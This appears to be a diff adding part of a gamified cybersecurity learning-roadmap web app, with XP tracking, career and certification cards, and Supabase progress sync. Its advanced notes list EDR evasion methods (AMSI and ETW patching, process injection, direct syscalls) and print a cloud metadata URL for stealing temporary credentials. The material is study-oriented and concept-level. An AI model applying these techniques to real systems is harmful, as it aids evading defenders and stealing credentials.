+  <button class="cbtn" id="btn-adv1" onclick="mc('adv1',this,500)">Mark as Complete (+500 XP)</button>
+</div>
+
+<!-- ADV 2: EDR -->
+<div class="view" id="view-adv2">
+  <div class="sh"><div class="st">// advanced · level 70–85</div><div class="stitle">EDR Evasion & Malware Dev</div><div class="sdesc">Modern defenses are smart. Learn to bypass them — this is where red team operators live.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">👻</span><div class="spn">EDR Evasion Notes</div><div class="spb" style="background:rgba(255,71,87,0.1);color:var(--red);border-color:rgba(255,71,87,0.3)">EXPERT</div></div>
+    <div class="spbody">
+      <div class="nb"><div class="nbc">EDR Bypass Techniques</div><div class="nbt">Core Evasion Concepts</div><div class="nbd"><strong>AMSI Bypass</strong> — Patch AMSI in memory before running PS. Classic: amsiInitFailed patch.<br><strong>ETW Bypass</strong> — Blind logging by patching ntdll.dll EtwEventWrite.<br><strong>Process Injection</strong> — Inject shellcode into legit processes (explorer.exe, svchost). Types: Classic, Process Hollowing, DLL Injection, Reflective DLL.<br><strong>Sleep Obfuscation</strong> — Encrypt payload in memory while sleeping to evade memory scans.<br><strong>Direct Syscalls</strong> — Bypass user-mode hooks by calling kernel directly (Syswhispers, Hell's Gate).<br><br>Languages: C, C++, Rust, Nim, Go preferred (Python shells get caught instantly).</div></div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-adv2" onclick="mc('adv2',this,500)">Mark as Complete (+500 XP)</button>
+</div>
+
+<!-- ADV 3: CLOUD -->
+<div class="view" id="view-adv3">
+  <div class="sh"><div class="st">// advanced · level 75–90</div><div class="stitle">Cloud Security — AWS/Azure/GCP</div><div class="sdesc">Everything is in the cloud. Cloud pentesting + AppSec = highest paid security roles.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">☁</span><div class="spn">Cloud Security Notes</div></div>
+    <div class="spbody">
+      <div class="nb"><div class="nbc">AWS Security</div><div class="nbt">Top Attack Vectors</div><div class="nbd"><strong>IAM Misconfigurations</strong> — Overly permissive roles, * in policies. Use <code>pacu</code> for enumeration.<br><strong>SSRF to Metadata</strong> — <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> → steal temp creds<br><strong>S3 Misconfiguration</strong> — Public read/write, exposed credentials in buckets<br><strong>Lambda Injection</strong> — Unsanitized inputs → code exec<br><strong>Container Escape</strong> — Privileged containers, exposed Docker sockets → host access<br><br><strong>Your dev background is a huge advantage</strong> — you understand how cloud apps are built. AppSec + DevSecOps is your natural path.</div></div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-adv3" onclick="mc('adv3',this,500)">Mark as Complete (+500 XP)</button>
+</div>
+
+<!-- ADV 4: CVE -->
+<div class="view" id="view-adv4">
+  <div class="sh"><div class="st">// advanced · level 85–100</div><div class="stitle">0-Day Research & CVE Writing</div><div class="sdesc">The pinnacle of offensive security. Find vulnerabilities the world hasn't seen.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">💀</span><div class="spn">0-Day Research Notes</div><div class="spb" style="background:rgba(255,71,87,0.1);color:var(--red);border-color:rgba(255,71,87,0.3)">ELITE</div></div>
+    <div class="spbody">
+      <div class="nb"><div class="nbc">Vulnerability Research</div><div class="nbt">Finding Your First CVE</div><div class="nbd"><strong>Fuzzing</strong> — Automated input mutation to find crashes. Tools: AFL++, LibFuzzer, Boofuzz<br><strong>Source Code Audit</strong> — Review OSS for vuln patterns. Focus: C/C++ memory corruption, PHP injection, JS prototype pollution<br><strong>Reverse Engineering</strong> — Binary analysis with Ghidra/IDA on closed-source software<br><strong>CVE Process</strong> — Find → write PoC → responsible disclosure → 90-day timeline → public CVE<br><br>Start: bug bounty → CVE in small OSS → major software. Your first CVE gets you into elite job shortlists instantly.</div></div>
+    </div>
+  </div>
+  <button class="cbtn" id="btn-adv4" onclick="mc('adv4',this,500)">Mark as Complete (+500 XP)</button>
+</div>
+
+<!-- JOBS -->
+<div class="view" id="view-jobs">
+  <div class="sh"><div class="st">// career path</div><div class="stitle">Internships & Jobs in India</div><div class="sdesc">Tailored for you — BCA + web dev background. AppSec and DevSecOps pay more because you can code.</div></div>
+
+  <div class="pathbox">
+    <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:7px">★ Your Recommended Path (Based on React/Node Background)</div>
+    <div style="font-size:12px;color:var(--text2);line-height:1.7">You already know <strong style="color:var(--text)">React, Node.js, web architecture</strong>. Most security people can't read code — you can. This makes you a <strong style="color:var(--text)">natural fit for AppSec and DevSecOps</strong>. Target: Web Pentest → Bug Bounty → AppSec Engineer. These roles pay ₹8–25 LPA vs ₹4–8 LPA for pure SOC analyst.</div>
+  </div>
+
+  <div class="cg">
+    <div class="ccard hl"><div class="crole">AppSec / Web Pentester</div><div class="clvl">LEVEL 40–60 · YOUR BEST FIT</div><div class="csal">₹8–18 LPA</div><div class="cwhen">Ready when you hit Level 40</div><div class="cskills"><span class="csk">Web Hacking</span><span class="csk">Burp Suite</span><span class="csk">OWASP Top 10</span><span class="csk">Code Review</span><span class="csk">React/Node</span></div></div>
+    <div class="ccard"><div class="crole">SOC Analyst</div><div class="clvl">LEVEL 20–30 · ENTRY POINT</div><div class="csal">₹3.5–7 LPA</div><div class="cwhen">Apply at Level 20-30 — start now</div><div class="cskills"><span class="csk">SIEM/Splunk</span><span class="csk">Log Analysis</span><span class="csk">IR</span><span class="csk">Networking</span></div></div>
+    <div class="ccard"><div class="crole">Bug Bounty Hunter</div><div class="clvl">LEVEL 40–50 · SIDE INCOME</div><div class="csal">$500–$10,000/bug</div><div class="cwhen">Start at Level 35+</div><div class="cskills"><span class="csk">OWASP</span><span class="csk">Recon</span><span class="csk">Automation</span><span class="csk">Reports</span></div></div>
+    <div class="ccard hl"><div class="crole">DevSecOps Engineer</div><div class="clvl">LEVEL 60–75 · HIGH PAY</div><div class="csal">₹12–25 LPA</div><div class="cwhen">After cloud certs</div><div class="cskills"><span class="csk">CI/CD Security</span><span class="csk">Docker/K8s</span><span class="csk">AWS/Azure</span><span class="csk">SAST/DAST</span></div></div>
+    <div class="ccard"><div class="crole">Penetration Tester</div><div class="clvl">LEVEL 65–80 · OSCP REQUIRED</div><div class="csal">₹10–20 LPA</div><div class="cwhen">After OSCP</div><div class="cskills"><span class="csk">OSCP</span><span class="csk">Metasploit</span><span class="csk">AD</span><span class="csk">Reports</span></div></div>
+    <div class="ccard"><div class="crole">Red Team Operator</div><div class="clvl">LEVEL 75–90 · ELITE</div><div class="csal">₹20–40 LPA</div><div class="cwhen">2-3 years + CRTO</div><div class="cskills"><span class="csk">C2 Frameworks</span><span class="csk">EDR Evasion</span><span class="csk">AD</span><span class="csk">Cloud</span></div></div>
+  </div>
+
+  <div style="background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:18px 20px;margin-bottom:22px">
+    <div style="font-size:13px;font-weight:700;margin-bottom:14px">Certification Roadmap</div>
+    <div class="certrow">
+      <div class="certitem"><div class="certlvl" style="color:var(--green)">LVL 20-30</div><div style="flex:1;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.2);border-radius:6px;padding:8px 12px;font-size:12px"><strong>eJPT</strong> (INE) — ₹0-3000, beginner pentest cert. Great starting point.</div></div>
+      <div class="certitem"><div class="certlvl" style="color:var(--accent)">LVL 40-50</div><div style="flex:1;background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.15);border-radius:6px;padding:8px 12px;font-size:12px"><strong>CEH</strong> (EC-Council) — Recognized in India/Middle East, good for govt jobs.</div></div>
+      <div class="certitem"><div class="certlvl" style="color:var(--orange)">LVL 60-75</div><div style="flex:1;background:rgba(255,140,66,0.06);border:1px solid rgba(255,140,66,0.15);border-radius:6px;padding:8px 12px;font-size:12px"><strong>OSCP</strong> (OffSec) — The gold standard. Changes your career completely.</div></div>
+      <div class="certitem"><div class="certlvl" style="color:var(--purple)">LVL 70-80</div><div style="flex:1;background:rgba(168,85,247,0.06);border:1px solid rgba(168,85,247,0.2);border-radius:6px;padding:8px 12px;font-size:12px"><strong>CRTO</strong> (ZeroPoint Security) — Red team ops, C2, AD. Great OSCP complement.</div></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /main -->
+</div><!-- /container -->
+
+<div class="toast" id="toast"><span style="color:var(--green)">★</span><span id="toast-msg"></span></div>
+
+<!-- MOBILE BOTTOM NAV -->
+<nav class="bnav">
+  <div class="bnav-inner">
+    <button class="bni active" id="bn-home" onclick="mobileNav('dashboard',this)"><span class="bni-icon">⬡</span><span>Home</span></button>
+    <button class="bni" id="bn-road" onclick="mobileNav('roadmap',this)"><span class="bni-icon">🗺</span><span>Roadmap</span></button>
+    <button class="bni" id="bn-topics" onclick="toggleDrawer()"><span class="bni-icon">📚</span><span>Topics</span></button>
+    <button class="bni" id="bn-jobs" onclick="mobileNav('jobs',this)"><span class="bni-icon">💼</span><span>Career</span></button>
+  </div>
+</nav>
+
+<!-- DRAWER OVERLAY -->
+<div class="drawer-overlay" id="drawer-overlay" onclick="toggleDrawer()"></div>
+
+<!-- TOPICS DRAWER -->
+<div class="drawer" id="topics-drawer">
+  <div class="drawer-handle"></div>
+  <div class="drawer-section">Beginner · 0–30</div>
+  <div class="drawer-item" onclick="drawerNav('beg1')"><div class="ndot"></div><div class="drawer-item-text">OSI / TCP-IP</div><span class="drawer-check">✓</span></div>
+  <div class="drawer-item" onclick="drawerNav('beg2')">
+    <div class="ndot"></div><div><div class="drawer-item-text">Linux &amp; Kali</div></div>
+  </div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:75%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('beg3')"><div class="ndot"></div><div class="drawer-item-text">Nmap &amp; Recon</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:60%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('beg4')"><div class="ndot"></div><div class="drawer-item-text">Burp Suite &amp; OWASP</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:40%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('beg5')"><div class="ndot"></div><div class="drawer-item-text">SQLi &amp; XSS</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:20%"></div></div>
+
+  <div class="drawer-section">Intermediate · 30–60</div>
+  <div class="drawer-item" onclick="drawerNav('mid1')"><div class="ndot"></div><div class="drawer-item-text">Metasploit</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:10%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('mid2')"><div class="ndot"></div><div class="drawer-item-text">Privilege Escalation</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:0%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('mid3')"><div class="ndot"></div><div class="drawer-item-text">Active Directory</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:0%"></div></div>
+  <div class="drawer-item" onclick="drawerNav('mid4')"><div class="ndot"></div><div class="drawer-item-text">Malware &amp; SIEM</div></div>
+  <div class="drawer-prog"><div class="drawer-prog-fill" style="width:0%"></div></div>
+
+  <div class="drawer-section">Advanced · 60–100</div>
+  <div class="drawer-item" onclick="drawerNav('adv1')"><div class="ndot"></div><div class="drawer-item-text">Red Teaming &amp; OSCP</div></div>
+  <div class="drawer-item" onclick="drawerNav('adv2')"><div class="ndot"></div><div class="drawer-item-text">EDR Evasion</div></div>
+  <div class="drawer-item" onclick="drawerNav('adv3')"><div class="ndot"></div><div class="drawer-item-text">Cloud Security</div></div>
+  <div class="drawer-item" onclick="drawerNav('adv4')"><div class="ndot"></div><div class="drawer-item-text">0-Day &amp; CVE Research</div></div>
+  <div style="height:16px"></div>
+</div>
+
+<script>
+const XP = {beg1:200,beg2:200,beg3:200,beg4:200,beg5:200,mid1:300,mid2:300,mid3:300,mid4:300,adv1:500,adv2:500,adv3:500,adv4:500};
+const BASE_XP = 2840;
+const SUPABASE_URL = 'https://uvsrdmdrjhuejopekkko.supabase.co';
+const SUPABASE_KEY = 'sb_publishable_AkySaCE5a-JzoYXDxz7cIA_CRXYWqr3';
+const USER_ID = 'akio';
+
+const S = {xp: BASE_XP, completed: new Set(['beg1']), total: 24};
+
+function saveToLocal(){
+  try { localStorage.setItem('cyberpath_progress', JSON.stringify({xp:S.xp,completed:[...S.completed]})); } catch(e){}
+}
+
+function loadFromLocal(){
+  try {
+    const raw = localStorage.getItem('cyberpath_progress');
+    if(raw){ const p=JSON.parse(raw); S.xp=p.xp??BASE_XP; S.completed=new Set(p.completed??['beg1']); }
+  } catch(e){}
+}
+
+async function saveProgress(){
+  saveToLocal();
+  try {
+    const res = await fetch(SUPABASE_URL+'/rest/v1/cyberpath_progress', {
+      method:'POST',
+      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY,'Content-Type':'application/json','Prefer':'resolution=merge-duplicates'},
+      body:JSON.stringify({id:USER_ID,xp:S.xp,completed:[...S.completed],updated_at:new Date().toISOString()})
+    });
+    if(!res.ok) throw new Error(res.status);
+  } catch(e){ console.warn('Supabase save failed',e); throw e; }
+}
+
+async function loadFromSupabase(){
+  const res = await fetch(SUPABASE_URL+'/rest/v1/cyberpath_progress?id=eq.'+USER_ID+'&select=*', {
+    headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY}
+  });
+  if(!res.ok) throw new Error(res.status);
+  const data = await res.json();
+  if(data && data[0]){ S.xp=data[0].xp??BASE_XP; S.completed=new Set(data[0].completed??['beg1']); saveToLocal(); }
+}
+
+function showSyncBadge(status){
+  let el=document.getElementById('sync-badge');
+  if(!el){
+    el=document.createElement('div'); el.id='sync-badge';
+    el.style.cssText='position:fixed;bottom:72px;right:12px;font-size:10px;font-family:JetBrains Mono,monospace;padding:4px 10px;border-radius:20px;z-index:9999;transition:opacity .6s;pointer-events:none';
+    document.body.appendChild(el);
+  }
+  el.style.opacity='1';
+  if(status==='saving'){
+    el.style.background='rgba(0,212,255,0.12)'; el.style.border='1px solid rgba(0,212,255,0.3)'; el.style.color='#00d4ff'; el.textContent='\u27F3 saving...';
+  } else if(status==='saved'){
+    el.style.background='rgba(0,255,136,0.12)'; el.style.border='1px solid rgba(0,255,136,0.3)'; el.style.color='#00ff88'; el.textContent='\u2713 synced';
+    setTimeout(()=>{ el.style.opacity='0'; },2000);
+  } else if(status==='offline'){
+    el.style.background='rgba(255,140,66,0.12)'; el.style.border='1px solid rgba(255,140,66,0.3)'; el.style.color='#ff8c42'; el.textContent='\u25CF saved offline';
+    setTimeout(()=>{ el.style.opacity='0'; },2500);
+  }
+}
+
+function showView(id, el){
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  document.querySelectorAll('.ni').forEach(n=>n.classList.remove('active'));
+  const v=document.getElementById('view-'+id);
+  if(v) v.classList.add('active');
+  if(el) el.classList.add('active');
+}
+
+function st(el,tid){
+  const panel=el.closest('.sp');
+  panel.querySelectorAll('.sptab').forEach(t=>t.classList.remove('active'));
+  panel.querySelectorAll('.spbody').forEach(b=>b.style.display='none');
+  el.classList.add('active');
+  const t=document.getElementById(tid);
+  if(t) t.style.display='block';
+}
+
+function mc(id, btn, xpGain){
+  const isDone = S.completed.has(id);
+  if(isDone){
+    S.completed.delete(id);
+    S.xp = Math.max(0, S.xp - xpGain);
+    btn.classList.remove('done');
+    btn.textContent = 'Mark as Complete (+'+xpGain+' XP)';
+    btn.onclick = ()=>mc(id,btn,xpGain);
+    toast('Undone — -'+xpGain+' XP removed');
+  } else {
+    S.completed.add(id);
+    S.xp += xpGain;
+    btn.classList.add('done');
+    btn.textContent = '✓ Completed — click to undo';
+    toast('Topic completed! +'+xpGain+' XP earned');
+  }
+  showSyncBadge('saving');
+  saveProgress()
+    .then(()=>showSyncBadge('saved'))
+    .catch(()=>showSyncBadge('offline'));
+  updateStats();
+  buildRoadmap();
+}
+
+function restoreButtons(){
+  Object.keys(XP).forEach(id=>{
+    const btn=document.getElementById('btn-'+id);
+    if(!btn) return;
+    if(S.completed.has(id)){
+      btn.classList.add('done');
+      btn.textContent='✓ Completed — click to undo';
+      btn.onclick=()=>mc(id,btn,XP[id]);
+    } else {
+      btn.classList.remove('done');
+      btn.textContent='Mark as Complete (+'+XP[id]+' XP)';
+      btn.onclick=()=>mc(id,btn,XP[id]);
+    }
+  });
+}
+
+function restoreButtons(){
+  Object.keys(XP).forEach(id=>{
+    const btn = document.getElementById('btn-'+id);
+    if(!btn) return;
+    if(S.completed.has(id)){
+      btn.classList.add('done');
+      btn.textContent = '✓ Completed — click to undo';
+      btn.onclick = ()=>mc(id, btn, XP[id]);
+    } else {
+      btn.classList.remove('done');
+      btn.textContent = 'Mark as Complete (+'+XP[id]+' XP)';
+      btn.onclick = ()=>mc(id, btn, XP[id]);
+    }
+  });
+}
+
+function updateStats(){
+  const pct = Math.min(Math.round((S.xp/10000)*100), 100);
+  document.getElementById('s-lvl').textContent = Math.floor(S.xp/200);
+  document.getElementById('s-done').textContent = S.completed.size;
+  document.getElementById('s-xp').textContent = S.xp.toLocaleString();
+  document.getElementById('xp-disp').textContent = S.xp.toLocaleString();
+  document.getElementById('cur-level').textContent = Math.floor(S.xp/200);
+  const ps = pct+'%';
+  document.getElementById('op-pct').textContent = ps;
+  document.getElementById('op-fill').style.width = ps;
+  document.getElementById('xp-pct-s').textContent = ps;
+  document.getElementById('xp-bar-s').style.width = ps;
+  document.querySelectorAll('.ms').forEach((m,i)=>{
+    const vals=[0,20,30,50,70,85,100];
+    if(pct >= vals[i]) m.classList.add('reached');
+  });
+}
+
+function toast(msg){
+  const t=document.getElementById('toast');
+  document.getElementById('toast-msg').textContent = msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'), 3000);
+}
+
+function cpy(btn){
+  const block=btn.closest('.cmd');
+  const txt=[...block.querySelectorAll('.cl')].map(l=>l.textContent).join('\n');
+  navigator.clipboard?.writeText(txt).then(()=>{
+    btn.textContent='copied!'; btn.style.color='var(--green)';
+    setTimeout(()=>{ btn.textContent='copy'; btn.style.color=''; }, 2000);
+  });
+}
+
+function ol(url){ window.open(url,'_blank'); }
+
+// ROADMAP
+const RM = {
+  beg:[
+    {t:'OSI Model & TCP/IP',s:'7 layers, 3-way handshake, key ports',done:true,cur:false},
+    {t:'Linux & Kali Setup',s:'File system, permissions, bash scripting',done:false,cur:true},
+    {t:'Nmap & Network Recon',s:'Scan types, NSE scripts, service enumeration',done:false,cur:false},
+    {t:'Wireshark & Packets',s:'Capture filters, protocol analysis',done:false,cur:false},
+    {t:'Burp Suite Setup',s:'Intercept, Repeater, Intruder workflow',done:false,cur:false},
+    {t:'OWASP Top 10',s:'All 10 categories, impact and remediation',done:false,cur:false},
+    {t:'SQL Injection',s:'Error-based, Union, Blind, Time-based',done:false,cur:false},
+    {t:'XSS — Reflected/Stored/DOM',s:'Payload crafting, cookie theft, BeEF',done:false,cur:false},
+    {t:'Password Cracking',s:'John, Hashcat, rainbow tables, wordlists',done:false,cur:false},
+  ],
+  mid:[
+    {t:'Metasploit Framework',s:'Exploit/payload/auxiliary, meterpreter, msfvenom',done:false,cur:false},
+    {t:'Linux Privilege Escalation',s:'SUID, sudo, cron, PATH hijacking, LinPEAS',done:false,cur:false},
+    {t:'Windows Privilege Escalation',s:'WinPEAS, service misconfig, SeImpersonate',done:false,cur:false},
+    {t:'Active Directory Attacks',s:'Kerberoasting, BloodHound, Mimikatz, DCSync',done:false,cur:false},
+    {t:'Malware Analysis Basics',s:'Static vs dynamic, Cuckoo, strings, Ghidra',done:false,cur:false},
+    {t:'SIEM / Splunk Fundamentals',s:'SPL queries, Windows event IDs, SOC workflow',done:false,cur:false},
+    {t:'Python Scripting for Hackers',s:'Custom scanners, exploit scripts, automation',done:false,cur:false},
+    {t:'eJPT or CEH Certification',s:'Study and exam attempt',done:false,cur:false},
+  ],
+  adv:[
+    {t:'OSCP Certification (PEN-200)',s:'Buffer overflow, 24h exam, full methodology',done:false,cur:false},
+    {t:'Red Team C2 Frameworks',s:'Cobalt Strike, Sliver, Havoc C2',done:false,cur:false},
+    {t:'EDR Evasion & Malware Dev',s:'AMSI bypass, process injection, syscalls',done:false,cur:false},
+    {t:'Cloud Security (AWS/Azure)',s:'IAM, SSRF metadata, S3 misconfig, pacu',done:false,cur:false},
+    {t:'Reverse Engineering',s:'Ghidra, IDA Pro, x86 assembly basics',done:false,cur:false},
+    {t:'0-Day Research & CVE Writing',s:'Fuzzing, source audit, responsible disclosure',done:false,cur:false},
+    {t:'DevSecOps',s:'SAST/DAST in CI/CD, container security, IaC',done:false,cur:false},
+  ]
+};
+
+function buildRoadmap(){
+  const root=document.getElementById('rm-root');
+  if(!root) return;
+  root.innerHTML='';
+  const tiers=[
+    {key:'beg',label:'Beginner Foundations',range:'Level 0–30',cls:'b',icon:'🛡'},
+    {key:'mid',label:'Intermediate Offense & Defense',range:'Level 30–60',cls:'m',icon:'⚔'},
+    {key:'adv',label:'Advanced & Expert',range:'Level 60–100',cls:'a',icon:'💀'},
+  ];
+  tiers.forEach(tier=>{
+    const div=document.createElement('div');
+    div.className='rmtier';
+    div.innerHTML=`<div class="rmth ${tier.cls}"><span>${tier.icon}</span><div class="rmtt">${tier.label}</div><div class="rmtr">${tier.range}</div></div>`;
+    const nodes=document.createElement('div');
+    nodes.className='rmnodes';
+    RM[tier.key].forEach((node,i)=>{
+      const n=document.createElement('div');
+      n.className='rmn'+(node.done?' done':'')+(node.cur?' cur':'');
+      n.innerHTML=`<div class="rmnd"></div><div class="rmnb"><div class="rmntitle">${node.t}</div><div class="rmnsub">${node.s}</div></div><div class="rmnck ${node.done?'chk':''}" onclick="toggleRM(this,'${tier.key}',${i})">${node.done?'✓':''}</div>`;
+      nodes.appendChild(n);
+    });
+    div.appendChild(nodes);
+    root.appendChild(div);
+  });
+}
+
+function toggleRM(el,tier,idx){
+  const n=el.closest('.rmn');
+  const isDone=el.classList.contains('chk');
+  el.classList.toggle('chk');
+  el.textContent = isDone ? '' : '✓';
+  n.classList.toggle('done');
+  RM[tier][idx].done = !isDone;
+  if(!isDone) toast('Progress logged! Keep pushing.');
+}
+
+// HEATMAP
+function buildHeatmap(){
+  const hm=document.getElementById('heatmap');
+  if(!hm) return;
+  const days=['Mo','Tu','We','Th','Fr','Sa','Su'];
+  const data=[0,1,0,2,1,0,0,0,3,2,1,4,2,1,1,1,3,4,2,0,0,0,2,3,1,3,1,0,0,0,1,2,0,3,1,0,4,4,3,4,2,1,1,3,4,4,3,1,0,0,2,3,4,4,3,2,1,4,4,3,4,2,1,0,2,3,4,3,2,0,0,1,4,4,4,3,1,0,3,4,4,4,2,0];
+  const lc=['','l1','l2','l3','l4'];
+  days.forEach((d,di)=>{
+    const row=document.createElement('div');
+    row.className='hmr';
+    const lbl=document.createElement('span');
+    lbl.className='hml';
+    lbl.textContent=d;
+    row.appendChild(lbl);
+    for(let w=0;w<12;w++){
+      const idx=w*7+di;
+      const lvl=data[idx]||0;
+      const cell=document.createElement('div');
+      cell.className='hmc '+(lc[lvl]||'');
+      cell.title=lvl>0?`${lvl*30}min study`:'No activity';
+      row.appendChild(cell);
+    }
+    hm.appendChild(row);
+  });
+}
+
+// CHARTS
+function buildCharts(){
+  const rc=document.getElementById('radarChart');
+  const bc=document.getElementById('barChart');
+  if(!rc||!bc||typeof Chart==='undefined') return;
+  new Chart(rc,{
+    type:'radar',
+    data:{
+      labels:['Networking','Linux','Web Hacking','Exploitation','AD/Enterprise','Malware','Scripting'],
+      datasets:[{label:'Skill',data:[70,60,50,30,15,10,55],backgroundColor:'rgba(0,212,255,0.15)',borderColor:'#00d4ff',borderWidth:2,pointBackgroundColor:'#00d4ff',pointRadius:4}]
+    },
+    options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{r:{min:0,max:100,grid:{color:'rgba(255,255,255,0.08)'},angleLines:{color:'rgba(255,255,255,0.08)'},pointLabels:{color:'#7a8fa8',font:{size:10}},ticks:{display:false}}}}
+  });
+  new Chart(bc,{
+    type:'bar',
+    data:{
+      labels:['Beginner 0–30','Intermediate 30–60','Advanced 60–100'],
+      datasets:[
+        {label:'XP Earned',data:[840,200,0],backgroundColor:['rgba(0,212,255,0.5)','rgba(168,85,247,0.4)','rgba(255,71,87,0.3)'],borderColor:['#00d4ff','#a855f7','#ff4757'],borderWidth:1,borderRadius:6},
+        {label:'XP Remaining',data:[1160,2800,5000],backgroundColor:['rgba(0,212,255,0.08)','rgba(168,85,247,0.06)','rgba(255,71,87,0.05)'],borderColor:['rgba(0,212,255,0.15)','rgba(168,85,247,0.12)','rgba(255,71,87,0.1)'],borderWidth:1,borderRadius:6}
+      ]
+    },
+    options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{x:{stacked:true,grid:{color:'rgba(255,255,255,0.05)'},ticks:{color:'#7a8fa8',font:{size:10}}},y:{stacked:true,grid:{color:'rgba(255,255,255,0.05)'},ticks:{color:'#7a8fa8',font:{size:10}}}}}
+  });
+}
+
+// Boot sequence: show local data instantly, then sync from Supabase
+loadFromLocal();
+updateStats();
+buildRoadmap();
+buildHeatmap();
+setTimeout(buildCharts, 200);
+restoreButtons();
+
+// Then fetch fresh data from Supabase
+loadFromSupabase()
+  .then(()=>{ updateStats(); buildRoadmap(); restoreButtons(); })
+  .catch(()=>console.warn('Using local data'));
+
+// MOBILE NAV
+function mobileNav(id, el){
+  // close drawer if open
+  closeDrawer();
+  // update bottom nav active state
+  document.querySelectorAll('.bni').forEach(b=>b.classList.remove('active'));
+  if(el) el.classList.add('active');
+  // show the view
+  showView(id, null);
+  // scroll to top
+  document.querySelector('.main').scrollTop = 0;
+  window.scrollTo(0,0);
+}
+
+function toggleDrawer(){
+  const d=document.getElementById('topics-drawer');
+  const o=document.getElementById('drawer-overlay');
+  const isOpen=d.classList.contains('open');
+  if(isOpen){ closeDrawer(); } else {
+    d.classList.add('open');
+    o.classList.add('open');
+    document.getElementById('bn-topics').classList.add('active');
+  }
+}
+
+function closeDrawer(){
+  document.getElementById('topics-drawer').classList.remove('open');
+  document.getElementById('drawer-overlay').classList.remove('open');
+  // only remove active from topics btn if another btn is active
+  document.getElementById('bn-topics').classList.remove('active');
+}
+
+function drawerNav(id){
+  closeDrawer();
+  document.querySelectorAll('.bni').forEach(b=>b.classList.remove('active'));
+  showView(id, null);
+  document.querySelector('.main').scrollTop=0;
+  window.scrollTo(0,0);
+}
+
+// Swipe down to close drawer
+(function(){
+  let startY=0;
+  const d=document.getElementById('topics-drawer');
+  d.addEventListener('touchstart',e=>{startY=e.touches[0].clientY},{passive:true});
+  d.addEventListener('touchend',e=>{
+    if(e.changedTouches[0].clientY - startY > 60) closeDrawer();
+  },{passive:true});
+})();
+</script>
+</body>
+</html>
